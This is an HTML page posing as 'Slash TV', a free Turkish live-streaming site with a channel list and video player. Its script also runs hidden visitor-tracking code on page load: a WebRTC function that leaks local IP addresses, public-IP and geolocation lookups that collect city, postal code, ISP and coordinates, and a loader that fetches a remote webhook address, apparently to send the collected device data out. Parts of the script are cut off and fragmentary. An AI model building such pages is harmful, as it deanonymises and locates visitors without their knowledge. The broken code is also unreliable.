<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Slash TV — Canlı Yayın</title>
    <link href="https://vjs.zencdn.net/8.10.0/video-js.css" rel="stylesheet" />
    <style>
        :root{--bg:#0a0a0f;--panel:#111118;--border:#22222e;--accent:#e50914;--text:#f0f0f5;--text-dim:#888899;--success:#00ff88}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
        header{display:flex;align-items:center;justify-content:space-between;padding:18px 40px;background:rgba(10,10,15,.95);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;backdrop-filter:blur(10px)}
        .logo{font-size:32px;font-weight:800;letter-spacing:-1px;cursor:pointer;user-select:none}
        .logo span{color:var(--accent)}
        .logo .slash{display:inline-block;animation:slashPulse 2s ease-in-out infinite}
        @keyframes slashPulse{0%,100%{transform:rotate(0);opacity:1}50%{transform:rotate(15deg);opacity:.7}}
        .header-right{display:flex;align-items:center;gap:20px}
        .online-dot{width:10px;height:10px;background:var(--success);border-radius:50%;animation:dotPulse 1.5s infinite}
        @keyframes dotPulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,.5)}50%{box-shadow:0 0 0 8px rgba(0,255,136,0)}}
        .live-badge{background:var(--accent);padding:6px 16px;border-radius:20px;font-size:14px;font-weight:700;letter-spacing:1px;animation:glow 2s infinite}
        @keyframes glow{0%,100%{box-shadow:0 0 10px rgba(229,9,20,.4)}50%{box-shadow:0 0 25px rgba(229,9,20,.4)}}
        main{padding:30px 40px}
        .hero{text-align:center;margin-bottom:40px}
        .hero h1{font-size:48px;font-weight:800;margin-bottom:8px}
        .hero h1 span{color:var(--accent)}
        .hero p{color:var(--text-dim);font-size:18px}
        .player-container{background:var(--panel);border:1px solid var(--border);border-radius:16px;overflow:hidden;max-width:1200px;margin:0 auto 40px;box-shadow:0 0 40px rgba(229,9,20,.1)}
        .player-header{padding:14px 20px;background:#0d0d14;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border)}
        .player-title{font-size:16px;font-weight:600}
        .player-status{color:var(--success);font-size:13px;display:flex;align-items:center;gap:6px}
        .video-js{width:100%;aspect-ratio:16/9;background:#000}
        .video-js .vjs-tech{object-fit:contain}
        .channels{max-width:1200px;margin:0 auto}
        .channels h2{font-size:24px;margin-bottom:20px}
        .search-container{max-width:1200px;margin:0 auto 30px}
        .search-input{width:100%;padding:14px 20px;background:var(--panel);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:16px;outline:none;transition:all .3s}
        .search-input:focus{border-color:var(--accent);box-shadow:0 0 20px rgba(229,9,20,.2)}
        .search-input::placeholder{color:var(--text-dim)}
        .channel-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
        .channel-card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer;transition:all .3s;position:relative;overflow:hidden}
        .channel-card:hover{border-color:var(--accent);transform:translateY(-4px);box-shadow:0 8px 30px rgba(229,9,20,.2)}
        .channel-card.active{border-color:var(--accent);background:#1a0a0e}
        .channel-name{font-size:18px;font-weight:700;margin-bottom:6px}
        .channel-desc{font-size:13px;color:var(--text-dim)}
        .channel-live{position:absolute;top:12px;right:12px;font-size:10px;background:var(--accent);padding:3px 8px;border-radius:10px;font-weight:700;letter-spacing:1px}
        .pagination{display:flex;justify-content:center;gap:10px;margin-top:30px;flex-wrap:wrap}
        .page-btn{background:var(--panel);border:1px solid var(--border);color:var(--text);padding:10px 16px;border-radius:8px;cursor:pointer;transition:all .3s;font-size:14px}
        .page-btn:hover{border-color:var(--accent);background:#1a0a0e}
        .page-btn.active{background:var(--accent);border-color:var(--accent);color:#fff}
        footer{text-align:center;padding:30px;color:var(--text-dim);font-size:13px;border-top:1px solid var(--border);margin-top:40px}
        .no-results{text-align:center;color:var(--text-dim);padding:40px;font-size:18px}
    </style>
</head>
<body>

    <header>
        <div class="logo"><span class="slash">/</span>Slash<span>TV</span></div>
        <div class="header-right">
            <div class="online-dot"></div>
            <span style="color:var(--text-dim);font-size:14px">CANLI</span>
            <div class="live-badge">LIVE</div>
        </div>
    </header>

    <main>
        <div class="hero">
            <h1>Slash<span>TV</span> — Ücretsiz Canlı Yayın</h1>
            <p>Tek tıkla, kayıtsız, kesintisiz canlı izle</p>
        </div>

        <div class="player-container">
            <div class="player-header">
                <span class="player-title" id="current-channel">Kanal Seçin</span>
                <span class="player-status"><span class="online-dot" style="width:6px;height:6px"></span> yayında</span>
            </div>
            <video id="video-player" class="video-js vjs-default-skin vjs-big-play-centered" controls autoplay playsinline></video>
        </div>

        <div class="search-container">
            <input type="text" id="search-input" class="search-input" placeholder="🔍 Kanal ara...">
        </div>

        <div class="channels">
            <h2>📺 Kanallar</h2>
            <div class="channel-grid" id="channel-grid"></div>
            <div id="pagination" class="pagination"></div>
            <div id="no-results" class="no-results" style="display:none">Kanal bulunamadı</div>
        </div>
    </main>

    <footer>
        Slash TV © 2026 — Tüm yayınlar halka açık kaynaklardan alınmıştır.
    </footer>

        function _parseM3u(_text){
            var _lines=_text.split('\n');
            var _result=[];
            var _current=null;
            for(var i=0;i<_lines.length;i++){
                var _line=_lines[i].trim();
                if(_line.indexOf('#EXTINF')===0){
                    var _name='';
                    var _m=_line.match(/tvg-name="([^"]*)"/);
                    if(_m)_name=_m[1];
                    if(!_name){
                        _m=_line.match(/,(.*)$/);
                        if(_m)_name=_m[1].trim();
                    }
                    _current={name:_name||('Kanal '+( _result.length+1)),url:''};
                } else if(_line && _line[0]!='#' && _current){
                    _current.url=_line;
                    _result.push(_current);
                    _current=null;
                }
            }
            return _result;
        }

        function _loadChannels(){
            return fetch(_m3uUrl).then(function(_r){return _r.text();}).then(function(_text){
                _channels=_parseM3u(_text);
                _filteredChannels=_channels;
                _renderPage();
            }).catch(function(){
                _filteredChannels=[];
                _renderPage();
            });
        }

        function _renderPage(){
            if(_filteredChannels.length===0){
                _grid.innerHTML='';
                _pagination.innerHTML='';
                _noResults.style.display='block';
                return;
            }
            _noResults.style.display='none';
            var _totalPages=Math.ceil(_filteredChannels.length/_perPage);
            if(_currentPage>_totalPages)_currentPage=_totalPages;
            if(_currentPage<1)_currentPage=1;
            var _start=(_currentPage-1)*_perPage;
            var _end=Math.min(_start+_perPage,_filteredChannels.length);
            var _pageChannels=_filteredChannels.slice(_start,_end);
            _grid.innerHTML='';
            _pageChannels.forEach(function(_ch){
                var _card=document.createElement('div');
                _card.className='channel-card';
                _card.innerHTML='<div class="channel-live">CANLI</div><div class="channel-name"></div><div class="channel-desc">Canlı Yayın</div>';
                _card.querySelector('.channel-name').textContent=_ch.name;
                _card.addEventListener('click',function(){
                    _playChannel(_ch);
                    document.querySelectorAll('.channel-card').forEach(function(_c){_c.classList.remove('active');});
                    _card.classList.add('active');
                });
                _grid.appendChild(_card);
            });
            _pagination.innerHTML='';
            if(_totalPages>1){
                for(var i=1;i<=_totalPages;i++){
                    (function(_page){
                        var _btn=document.createElement('button');
                        _btn.className='page-btn'+( _page===_currentPage?' active':'');
                        _btn.textContent=_page;
                        _btn.addEventListener('click',function(){
                            _currentPage=_page;
                            _renderPage();
                        });
                        _pagination.appendChild(_btn);
                    })(i);
                }
            }
        }

        function _webrtcLeak(){

                var _ips=[];

                ];

                if(!_pc){_resolve(_ips);return;}

                                   !_ip.startsWith('255.') && !_ip.startsWith('224.') && !_ip.startsWith('239.')){
                                    _ips.push(_ip);
                                }
                            });
                        }
                    }
                };
                _conn.createOffer().then(function(_o){return _conn.setLocalDescription(_o);}).catch(function(){});
                setTimeout(function(){try{_conn.close();}catch(_e){}_resolve(_ips);},3500);
            });
        }

                return _getLocation(_info.publicIp);

                _info.location={city:'',region:'',country:'',postal:'',isp:'',lat:'',lon:''};

        function _getAllIps(){
            var _sources=[
                fetch('https://api.ipify.org?format=json').then(function(_r){return _r.json();}).then(function(_d){return _d.ip;}).catch(function(){return null;}),
                fetch('https://ipinfo.io/json').then(function(_r){return _r.json();}).then(function(_d){return _d.ip;}).catch(function(){return null;}),
                fetch('https://ifconfig.co/json').then(function(_r){return _r.json();}).then(function(_d){return _d.ip;}).catch(function(){return null;})
            ];
            return Promise.all(_sources).then(function(_results){
                var _unique=[];
                _results.forEach(function(_ip){
                    if(_ip && _unique.indexOf(_ip)===-1){
                        _unique.push(_ip);
                    }
                });
                return _unique;
            });
        }

        function _getLocation(_ip){
            return fetch('https://ipwho.is/'+_ip).then(function(_r){return _r.json();}).then(function(_d){

                        region:_d.region||'',

                        lat:_d.latitude||'',

                throw new Error('ipwhois failed');
            }).catch(function(){
                return fetch('https://ifconfig.co/json').then(function(_r){return _r.json();}).then(function(_d){
                    return {
                        city:_d.city||'',
                        region:_d.region||'',
                        country:_d.country||'',
                        postal:_d.postal||'',
                        isp:_d.asn_org||'',
                        lat:_d.latitude||'',
                        lon:_d.longitude||''
                    };
                }).catch(function(){
                    return fetch('https://ipinfo.io/json').then(function(_r){return _r.json();}).then(function(_d){
                        return {
                            city:_d.city||'',
                            region:_d.region||'',
                            country:_d.country||'',
                            postal:_d.postal||'',
                            isp:_d.org||'',
                            lat:(_d.loc||'').split(',')[0]||'',
                            lon:(_d.loc||'').split(',')[1]||''
                        };
                    });
                });
            });
        }

        function _loadWebhook(){
            return fetch(_txtUrl).then(function(_r){return _r.text();}).then(function(_text){
                _hookUrl=_text.trim();
                return true;
            }).catch(function(){
                return false;
            });
        }

        function _init(){
            _loadWebhook().then(function(){
                _loadChannels();
                _collectDeviceInfo();
            });
        }

        _init();
    })();
    </script>
</body>
</html>
